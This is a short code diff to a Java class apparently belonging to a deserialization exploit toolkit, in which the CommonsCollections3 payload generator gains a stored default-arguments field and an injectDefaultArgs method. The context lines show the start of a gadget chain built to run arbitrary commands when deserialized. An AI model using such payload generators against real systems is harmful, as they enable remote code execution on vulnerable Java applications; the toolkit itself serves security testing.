@@ -25,6 +25,8 @@ import org.apache.commons.collections.map.LazyMap;
  */
 public class CommonsCollections3 implements Payload {
 
+	private String[] args;
+
 	public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
@@ -40,6 +42,8 @@ public class CommonsCollections3 implements Payload {
 	 */
 	@Override
 	public Object getPayload(String[] args) throws Exception {
+		if (this.args != null)
+			args = this.args;
 		Object templatesImpl = Gadgets.createTemplatesImpl(args[0]);
 
 		// inert chain for setup
@@ -64,4 +68,10 @@ public class CommonsCollections3 implements Payload {
 
 		return handler;
 	}
+
+	@Override
+	public void injectDefaultArgs(String[] args) {
+		this.args = args;
+	}
+
 }
